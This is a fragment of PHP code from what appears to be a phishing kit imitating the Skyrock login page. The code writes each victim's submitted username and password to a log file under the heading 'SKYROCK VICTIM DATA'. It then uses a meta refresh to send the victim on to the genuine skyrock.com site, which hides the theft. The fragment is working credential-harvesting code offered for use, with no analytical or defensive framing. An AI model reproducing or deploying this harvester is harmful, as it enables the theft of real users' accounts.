...
file_put_contents($file, print_r("\nSKYROCK VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
...
file_put_contents($file, "Username: " . $_POST['need_login_form_login'] ."\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['need_login_form_password'] ."\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://www.skyrock.com/?connect=1"/> 
